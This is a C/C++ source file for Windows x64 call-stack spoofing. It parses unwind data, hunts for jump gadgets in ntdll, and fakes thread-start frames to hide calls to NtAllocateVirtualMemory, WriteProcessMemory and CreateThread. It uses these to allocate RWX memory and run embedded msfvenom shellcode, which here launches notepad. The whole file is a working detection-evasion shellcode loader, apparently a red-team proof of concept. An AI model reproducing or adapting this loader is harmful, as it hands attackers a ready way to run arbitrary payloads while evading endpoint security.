#include <main.h>


#define GADGETS_MAX 16  // max size for gadgets array


PGADGET_INFO* g_GadgetList = NULL;
DWORD safeGadgetCount = 0;

// msfvenom -p windowx/x64/exec CMD=notepad -f c
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x00";


/*
    Main function that will be used to build the syntetic frames
    prepare the arguments for the specified API and call it, after that
    it cleansup and restores execution to the caller
*/
extern "C" PVOID Spoof(STACK_INFO* pStackInfo);


/*
    Find the exception directory for the given module
    pExceptInfo - pointer to EXCEPT_INFO struct that will receive the parsed information
*/
BOOL findExceptionDir(PEXCEPT_INFO pExceptInfo) {

    if (!pExceptInfo)
        return FALSE;

    PBYTE hModule = pExceptInfo->hModule;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Not a valid image\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS64 pNtHdrs = (PIMAGE_NT_HEADERS64)(hModule + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Failed to find valid NT signature\n");
        return FALSE;
    }

    PIMAGE_OPTIONAL_HEADER pOptHdr = &pNtHdrs->OptionalHeader;

    if (pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress == 0) {
        printf("[!] No exceptions directory for the module\n");
        return FALSE;
    }

    pExceptInfo->pExceptionDirectory = (ULONG_PTR)(hModule + pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
    pExceptInfo->dwRuntimeFuncCount = pOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION);

    return TRUE;
}


/*
    Process the unwind information for a specified function
    hModule         - Handle to the module for the particular function
    pUnwindInfo     - pointer to the found uwind information struct
    pStackFrameInfo - pointer to a STACK_FRAME_INFO struct that will be populated
*/
BOOL processUnwindInfo(
    IN HMODULE hModule,
    IN PUNWIND_INFO pUnwindInfo,
    OUT PSTACK_FRAME_INFO pStackFrameInfo
) {

    PUNWIND_CODE pUnwindCode = pUnwindInfo->UnwindCode;
    ULONG unwindCodesIndex = 0;
    ULONG frameOffset = 0; 
    DWORD offsetBytes = 0, offset = 0;

    printf("\tStarting to process unwind info at address: %p\n", pUnwindInfo);
    printf("\tCount of unwind codes: %d\n", pUnwindInfo->CountOfCodes);
    
    // start processing all of the unwind codes
    while (unwindCodesIndex < pUnwindInfo->CountOfCodes) {
    
        ULONG unwindOperation = pUnwindCode[unwindCodesIndex].UnwindOp;
        ULONG operationInfo = pUnwindCode[unwindCodesIndex].OpInfo;

        switch (unwindOperation) {

        case UWOP_PUSH_NONVOL:
            printf("\tprocessing UWOP_PUSH_NONVOL\n");
            pStackFrameInfo->stackFrameSize += 8;
            break;

        case UWOP_SAVE_NONVOL:
            pStackFrameInfo->hasSaveNonvol = TRUE;
            offsetBytes = pUnwindCode[unwindCodesIndex + 1].FrameOffset * 8;

            if (pStackFrameInfo->maxSaveNonvolOffset < offsetBytes)
                pStackFrameInfo->maxSaveNonvolOffset = offsetBytes;
            printf("\tprocessing UWOP_SAVE_NONVOL values: %d, offset: %d\n", operationInfo, offsetBytes);

            unwindCodesIndex++;
            break;

        case UWOP_ALLOC_SMALL:
            printf("\tprocessing UWOP_ALLOC_SMALL with opInfo: %u\n", operationInfo);
            pStackFrameInfo->stackFrameSize += ((operationInfo * 8) + 8);
            break;

        case UWOP_ALLOC_LARGE:

            unwindCodesIndex++;
            frameOffset = pUnwindCode[unwindCodesIndex].FrameOffset;

            printf("\tprocessing UWOP_ALLOC_LARGE with frameOffset: %u, opInfo: %u\n", frameOffset, operationInfo);

            if (operationInfo == 0) {
                frameOffset *= 8;
            }
            else {
                unwindCodesIndex++;
                frameOffset += (pUnwindInfo->UnwindCode[unwindCodesIndex].FrameOffset << 16);
            }

            pStackFrameInfo->stackFrameSize += frameOffset;
            break;

        case UWOP_SET_FPREG:
            printf("\tprocessing UWOP_SET_FPREG\n");
            pStackFrameInfo->useFPreg = TRUE;
            break;

        case UWOP_SAVE_XMM128:
            // TODO potentially do the same as for SAVE_NONVOL
            printf("\tprocessing UWOP_SAVE_XMM128\n");
            unwindCodesIndex++;
            break;

        case UWOP_SAVE_XMM128_FAR:
            // TODO potentially do the same as for SAVE_NONVOL
            printf("\tprocessing UWOP_SAVE_XMM128\n");
            unwindCodesIndex += 2;
            break;

        case UWOP_PUSH_MACHFRAME:
            printf("\tprocessing UWOP_PUSH_MACHFRAME\n");

            if (pUnwindCode[unwindCodesIndex].OpInfo == 0) {
                pStackFrameInfo->stackFrameSize += 40;
            }
            else {
                pStackFrameInfo->stackFrameSize += 48;
            }
            break;

        case UWOP_SAVE_NONVOL_FAR:
            offset =
                pUnwindCode[unwindCodesIndex + 1].FrameOffset |
                (pUnwindCode[unwindCodesIndex + 2].FrameOffset << 16);
            
            offsetBytes = offset * 8;

            // record the maximum offset for save_nonvol
            pStackFrameInfo->hasSaveNonvol = TRUE;
            if (offsetBytes > pStackFrameInfo->maxSaveNonvolOffset)
                pStackFrameInfo->maxSaveNonvolOffset = offsetBytes;

            printf("\tprocessing UWOP_SAVE_NONVOL_FAR reg=%u offset=%u\n",
                operationInfo, offsetBytes);

            unwindCodesIndex += 2;
            break;

        default:
            printf("\tunknown unwind OP INFO: %d\n", unwindOperation);
            break;
        }

        unwindCodesIndex++;
    }

    if (pStackFrameInfo->stackFrameSize & 7)
        printf("\t! Stack size is not 8 byte aligned\n");

    if (pStackFrameInfo->stackFrameSize > 0x4000)
        printf("\t! Too large stack size: %ld, possibly corrupted unwind info\n", pStackFrameInfo->stackFrameSize);

    return TRUE;
}


/*
    Calculate the stack frame size for the specified function
    hModule         - handle to the module containing the function
    funcAddress     - address of the function
    pStackFrameInfo - pointer to a STACK_FRAME_INFO struct that will be populated
    offsetFromStart - optional offset from the start of the function
*/
BOOL calculateFuncStackSize(
    IN HMODULE hModule, 
    IN ULONG_PTR funcAddress, 
    OUT PSTACK_FRAME_INFO pStackFrameInfo,
    IN OPTIONAL DWORD offsetFromStart
) {

    EXCEPT_INFO ExceptInfo = { 0 };
    BOOL success = FALSE, found = FALSE;
    PRUNTIME_FUNCTION pRuntimeFunc = NULL;
    DWORD funcOffset = 0;
    PUNWIND_INFO pUnwindInfo = NULL;
    DWORD prologSize = 0;
    BOOL prologCaptured = FALSE;



    if (!pStackFrameInfo)
        goto _CLEANUP;

    printf("[+] Calculating stack frame size for function: %p\n", funcAddress);

    // populate the hModule member and find the exceptions dir
    ExceptInfo.hModule = (PBYTE)hModule;
    if (!findExceptionDir(&ExceptInfo)) {
        goto _CLEANUP;
    }

    // find the offset of the function from the start of the module
    pRuntimeFunc = (PRUNTIME_FUNCTION)ExceptInfo.pExceptionDirectory;
    funcOffset = (PBYTE)funcAddress - (PBYTE)hModule;

    // iterate over all exception directory entries until we find the runtime function entry for the specified address
    for (int i = 0; i < ExceptInfo.dwRuntimeFuncCount; i++) {
        // if the offset from the start of the module is between the begin and end of the runtime function entry
        // then its the correct one
        if (funcOffset >= pRuntimeFunc->BeginAddress && funcOffset < pRuntimeFunc->EndAddress) {
            found = TRUE;
            break;
        }
        pRuntimeFunc++;
    }

    // if nothing is found, most likely it is a leaf function
    // and the stack frame size is just the return address
    if (!found) {
        printf("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);

        pStackFrameInfo->returnRip = funcAddress;
        pStackFrameInfo->stackFrameSize = 8;

        success = TRUE;
        goto _CLEANUP;
    }

    // if there is a runtime function entry found, but unwind data is empty then again its a leaf fn
    if (pRuntimeFunc->UnwindData == 0) {
        printf("\tleaf function detected: %p, returning stack size of 8\n", funcAddress);

        pStackFrameInfo->returnRip = funcAddress;
        pStackFrameInfo->stackFrameSize = 8;

        success = TRUE;
        goto _CLEANUP;
    }

    // pointer to the actual unwind data
    pUnwindInfo = (PUNWIND_INFO)((PBYTE)hModule + pRuntimeFunc->UnwindData);

    // Start processing the unwind information
    while (TRUE) {
    
        // Capture the original function prolog size
        if (!prologCaptured) {
            prologSize = pUnwindInfo->SizeOfProlog;
            prologCaptured = TRUE;
        }
    
        // process the unwind info and accumulate the stack frame size
        if (!processUnwindInfo(hModule, pUnwindInfo, pStackFrameInfo))
            return FALSE;

        // if there is no chain info included, break from the loop
        if (!(pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
            break;

        printf("\tChained info detected, processing further\n");
        // if there is chained info and the count of codes is uneven, it needs to be padded
        ULONG unwindCount = pUnwindInfo->CountOfCodes;
        if (unwindCount & 1)
            unwindCount++;


        // The chained RUNTIME_FUNCTION is stored after unwind codes
        PRUNTIME_FUNCTION chainedRf = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[unwindCount]);
    
        pUnwindInfo = (PUNWIND_INFO)((PBYTE)hModule + chainedRf->UnwindData);
    }

    // account for the return address
    pStackFrameInfo->stackFrameSize += 8;

    // return the RIP address that will be used in the fake frame, 
    // either with a fixed offset or with the prolog size
    if (offsetFromStart != 0) {
        pStackFrameInfo->returnRip = funcAddress + offsetFromStart;
    }
    else {
        pStackFrameInfo->returnRip = funcAddress + prologSize;
    }

    printf("\tCalculated stack size: %llu, prolog size: %d\n", pStackFrameInfo->stackFrameSize, prologSize);
    success = TRUE;

_CLEANUP:
    return success;
}



/*
    Iterate over the .text section of the specified module to find all potential safe jump gadgets
    hModule     - handle to the module
    gadgetArray - pointer to a pointer that will represent the found gadget array
    arraySize   - maximum size of the gadget array
    safeCount   - count of safe gadgets that can be used
*/
BOOL findJmpGadgets(
    IN HMODULE hModule, 
    OUT PGADGET_INFO** gadgetArray,
    IN SIZE_T arraySize, 
    OUT PDWORD safeCount
) {

    // validate parameters
    if (!hModule || !arraySize || !safeCount || !gadgetArray)
        return FALSE;

    *safeCount = 0;

    PBYTE base = (PBYTE)hModule;
    DWORD matches = 0;
    PIMAGE_DOS_HEADER pDosHdr = NULL;
    PIMAGE_NT_HEADERS pNtHdrs = NULL;
    PIMAGE_SECTION_HEADER section = NULL;
    PGADGET_INFO* pGadgetArray = NULL;
    PGADGET_INFO pInfo = NULL;

    // Validate the DOS headers
    pDosHdr = (PIMAGE_DOS_HEADER)base;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Not a valid image\n");
        goto _CLEANUP;
    }

    // Validate the NT headers
    pNtHdrs = (PIMAGE_NT_HEADERS)(base + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Failed to find valid NT signature\n");
        goto _CLEANUP;
    }

    // Iterate over all sections and process only executable ones
    section = IMAGE_FIRST_SECTION(pNtHdrs);
    pGadgetArray = (PGADGET_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PGADGET_INFO) * arraySize);
    if (pGadgetArray == NULL)
        goto _CLEANUP;

    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++, section++) {
        
        DWORD sectionSize = 0;
        PBYTE sectionBase = NULL;

        // Check if section is executable
        if (!(section->Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        sectionBase = base + section->VirtualAddress;
        sectionSize = section->Misc.VirtualSize;
    
        // search for our gadget - 'jmp qword ptr [rbx]' -> 0xff 0x23
        for (int z = 0; z + 1 < sectionSize; z++) {

            // Check if the array is already full
            if (*safeCount >= arraySize)
                break;

            // On every match check if the gadget is safe for usage
            if (sectionBase[z] == 0xff && sectionBase[z + 1] == 0x23) {
                matches++;

                ULONG_PTR address = (ULONG_PTR)(sectionBase + z);
                STACK_FRAME_INFO stackFrameInfo = { 0 };

                // Get the frame size of the gadget and other information from the unwind info
                if (calculateFuncStackSize(
                    hModule,
                    (ULONG_PTR)address,
                    &stackFrameInfo,
                    0
                )) {
                    // TODO handle UWOP_SET_FPREG
                    if (stackFrameInfo.useFPreg)
                        continue;

                    // allocate a buffer that will hold the information
                    pInfo = (PGADGET_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(GADGET_INFO));
                    if (pInfo == NULL)
                        goto _CLEANUP;

                    // check if there is UWOP_SAVE_NONVOL with offset bigger than the stack frame size
                    // If there is the gadget is not safe, until this is implemented in assembly
                    if (stackFrameInfo.hasSaveNonvol) {
                        if (stackFrameInfo.maxSaveNonvolOffset < stackFrameInfo.stackFrameSize) {
                            // if the gadget is safe insert it in the array
                            pInfo->address = (PVOID)address;
                            pInfo->stackFrameSize = stackFrameInfo.stackFrameSize;
                            pGadgetArray[*safeCount] = pInfo;
                            (*safeCount)++;
                        }
                        else {
                            // if its not safe proceed to the next one
                            HeapFree(GetProcessHeap(), 0 , pInfo);
                            continue;
                        }
                    }
                    else {
                        pInfo->address = (PVOID)address;
                        pInfo->stackFrameSize = stackFrameInfo.stackFrameSize;
                        pGadgetArray[*safeCount] = pInfo;
                        (*safeCount)++;
                    }
                }
                else {
                    continue;
                }
            }
        }
    }
    *gadgetArray = pGadgetArray;
    pGadgetArray = NULL;

    printf("[+] Total gadget matches: %d, safe gadgets count: %d\n", matches, *safeCount);

_CLEANUP:
    if (!*gadgetArray && pGadgetArray)
        HeapFree(GetProcessHeap(), 0, pGadgetArray);

    return (*safeCount > 0);
}



/*
    Main wrapper function for invoking an API with spoofed call stack
    pApiCallInfo - pointer to API_CALL_INFO struct that holds all the information, about spoofed frames and the api to be called
    ...          - variadic arguments that represent the arguments for the API to be called
*/
BOOL CallStackSpoof(PAPI_CALL_INFO pApiCallInfo, ...) {

    // validate parameters
    if (!pApiCallInfo || !pApiCallInfo->spoofFramesTargetsArray || !pApiCallInfo->spoofFramesCount)
        return FALSE;

    printf("[+] Spoofing stack for function:\n\tAddress: %p, number of arguments: %d\n", pApiCallInfo->pFuncAddr, pApiCallInfo->apiFuncArgsCount);

    va_list va_args;
    STACK_INFO stackInfo = { 0 };
    uint64_t* args = NULL;
    BOOL success = FALSE;

    // Allocate memory for the spoofed frames
    stackInfo.FramesCount = pApiCallInfo->spoofFramesCount;
    stackInfo.pFrames = (PSTACK_FRAME_INFO)
        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, stackInfo.FramesCount * sizeof(STACK_FRAME_INFO));

    // choose a pseudo random gadget from the list
    SIZE_T index = rand() % safeGadgetCount;
    PGADGET_INFO jmpGadget = g_GadgetList[index];

    printf("\tGadget that will be used: %p, with frame size: %d\n", jmpGadget->address, jmpGadget->stackFrameSize);

    // Prepare all the information for the frames to be spoofed
    for (SIZE_T i = 0; i < pApiCallInfo->spoofFramesCount; i++) {
        
        PSPOOF_TARGET pSpoofTarget = (PSPOOF_TARGET)pApiCallInfo->spoofFramesTargetsArray[i];

        // get the stack frame size for every spoof target
        if (!calculateFuncStackSize(pSpoofTarget->hModule, (ULONG_PTR)(pSpoofTarget->funcAddress), &stackInfo.pFrames[i], pSpoofTarget->offsetFromStart)) {
            goto _CLEANUP;
        }

        // validate the frame, this is needed before unsafe SAVE_NONVOLs can be included
        if (stackInfo.pFrames[i].hasSaveNonvol
            && stackInfo.pFrames[i].maxSaveNonvolOffset >= stackInfo.pFrames[i].stackFrameSize) {

            printf(
                "[!] Unwind Info for function: %p contains SAVE_NONVOL with offset %d, which is bigger than the stack frame of %d bytes\n",
                pSpoofTarget->funcAddress,
                stackInfo.pFrames[i].maxSaveNonvolOffset,
                stackInfo.pFrames[i].stackFrameSize
            );

            goto _CLEANUP;
        }
    }

    // Prepare jump gadget address and its frame size
    stackInfo.pGadgetAddr = (uint64_t)jmpGadget->address;
    stackInfo.dwGadgetSize = jmpGadget->stackFrameSize;
    // Prepare the address of the target API to be invoked
    stackInfo.pTargetFunc = pApiCallInfo->pFuncAddr;

    // Calculate to the total size of syntetic frames for cleanup before restoring the execution flow
    for (SIZE_T i = 0; i < stackInfo.FramesCount; i++)
        stackInfo.totalFrameSizes += stackInfo.pFrames[i].stackFrameSize;

    stackInfo.totalFrameSizes += stackInfo.dwGadgetSize;
    printf("\tTotal frame size for spoofed frames: %ld\n", stackInfo.totalFrameSizes);

    // Validate the count of the arguments that the API expects
    if (pApiCallInfo->apiFuncArgsCount <= 4) {
        stackInfo.dwNumOfArgs = 4;
    }
    else if (pApiCallInfo->apiFuncArgsCount % 2 != 0) {
        stackInfo.dwNumOfArgs = pApiCallInfo->apiFuncArgsCount + 1;
    }
    else {
        stackInfo.dwNumOfArgs = pApiCallInfo->apiFuncArgsCount;
    }


    // Allocate memory for the arguments and add the to the structure that will be used by the Spoofer
    stackInfo.pFuncArgs = (ULONG_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8 * stackInfo.dwNumOfArgs);

    args = (uint64_t*)stackInfo.pFuncArgs;

    // Parse the variadic arguments
    va_start(va_args, pApiCallInfo);
    for (int i = 0; i < pApiCallInfo->apiFuncArgsCount; i++) {
        args[i] = va_arg(va_args, UINT64);
    }
    va_end(va_args);

    // for debug
    printf("Press any key to continue..\n");
    getchar();
    //

    // Execute the API with a spoofed call stack and get the return value
    pApiCallInfo->retVal = Spoof(&stackInfo);

    success = TRUE;

_CLEANUP:
    if (stackInfo.pFrames) {
        HeapFree(GetProcessHeap(), 0, stackInfo.pFrames);
    }
    if (stackInfo.pFuncArgs)
        HeapFree(GetProcessHeap(), 0, (LPVOID)stackInfo.pFuncArgs);

    return success;
}



/*
    Simple example of executing a notepad shellcode trough spoofed API calls
*/
int main()
{
    srand((unsigned int)time(NULL));

    API_CALL_INFO apiCallInfo = { 0 };
    NTSTATUS status = 0;
    DWORD bytesWritten = 0, threadId = 0, success = -1;

    // Functions that will be used for the spoofed call stack frames
    LPCSTR SpoofName1 = "RtlUserThreadStart";
    LPCSTR SpoofName2 = "BaseThreadInitThunk";
    SPOOF_TARGET SpoofApi1 = { 0 };
    SPOOF_TARGET SpoofApi2 = { 0 };
    PSPOOF_TARGET spoofArray[2] = { 0 };
    
    // Handles to the modules that are required
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    HMODULE hMod2 = GetModuleHandleA("kernel32.dll");

    // Prepare information about the spoof targets
    SpoofApi1.funcAddress = (ULONG_PTR)GetProcAddress(hMod, SpoofName1);
    SpoofApi1.hModule = hMod;
    SpoofApi1.offsetFromStart = 0x21;

    SpoofApi2.funcAddress = (ULONG_PTR)GetProcAddress(hMod2, SpoofName2);
    SpoofApi2.hModule = hMod2;
    SpoofApi2.offsetFromStart = 0x14;

    // Store them in an array for syntetic frame preparations
    spoofArray[0] = &SpoofApi1;
    spoofArray[1] = &SpoofApi2;

    // Find safe jump gadgets to use as atm couple of unwind opcodes are not implemented
    findJmpGadgets(hMod, &g_GadgetList, GADGETS_MAX, &safeGadgetCount);

    // Prepare the API_CALL_INFO struct that will hold information about the syntetic frames
    // and also the API to be called and its args
    apiCallInfo.spoofFramesCount = 2;
    apiCallInfo.spoofFramesTargetsArray = spoofArray;

    // The following APIs will be called with spoofed call stacks
    ULONG_PTR pNtAllocateVirtualMemory = (ULONG_PTR)GetProcAddress(hMod, "NtAllocateVirtualMemory");
    ULONG_PTR pWriteProcessMemory = (ULONG_PTR)GetProcAddress(hMod2, "WriteProcessMemory");
    ULONG_PTR pCreateThread = (ULONG_PTR)GetProcAddress(hMod2, "CreateThread");

    // Starting with NtAllocateVirtualMemory to allocate memory for the shellcode
    apiCallInfo.pFuncAddr = pNtAllocateVirtualMemory;
    apiCallInfo.apiFuncArgsCount = 6;

    PVOID addr = NULL;
    SIZE_T size = sizeof(shellcode);

    if (!CallStackSpoof(
        &apiCallInfo, 
        (uint64_t)(HANDLE)-1,
        (uint64_t)&addr,
        (uint64_t)0,
        (uint64_t)&size,
        (uint64_t)(MEM_COMMIT | MEM_RESERVE),
        (uint64_t)PAGE_EXECUTE_READWRITE
        )) {
        printf("[!] Spoofing failed\n");
        goto _CLEANUP;
    }

    status = (NTSTATUS)(ULONG_PTR)apiCallInfo.retVal;
    printf("[+] Allocation: %p, status: 0x%08X\n", addr, status);

    // Next we are calling WriteProcessMemory to write the actual shellcode to the allocation
    apiCallInfo.pFuncAddr = pWriteProcessMemory;
    apiCallInfo.apiFuncArgsCount = 5;

    if (!CallStackSpoof(
        &apiCallInfo,
        (uint64_t)(HANDLE)-1,
        (uint64_t)addr,
        (uint64_t)shellcode,
        (uint64_t)sizeof(shellcode),
        (uint64_t)&bytesWritten
    )) {
        printf("[!] Spoofing failed\n");
        goto _CLEANUP;
    }

    if (!apiCallInfo.retVal) {
        printf("[!] WriteProcessMemory failed\n");
        goto _CLEANUP;
    }
    else {
        printf("[+] Shellcode bytes written: %d\n", bytesWritten);
    }

    // Finally we can create a thread to execute the shellcode
    apiCallInfo.pFuncAddr = pCreateThread;
    apiCallInfo.apiFuncArgsCount = 6;

    if (!CallStackSpoof(
        &apiCallInfo,
        (uint64_t)NULL,
        (uint64_t)0,
        (uint64_t)addr,
        (uint64_t)NULL,
        (uint64_t)0,
        (uint64_t)&threadId
    )) {
        printf("[!] Spoofing failed\n");
        goto _CLEANUP;
    }


    printf("[+] Thread created with ID: %d\n", threadId);
    WaitForSingleObject((HANDLE)apiCallInfo.retVal, INFINITE);
    success = 0;

_CLEANUP:
    // Cleanup the gadget array
    for (DWORD i = 0; i < safeGadgetCount; i++)
        HeapFree(GetProcessHeap(), 0, g_GadgetList[i]);
    HeapFree(GetProcessHeap(), 0, g_GadgetList);

    return success;
}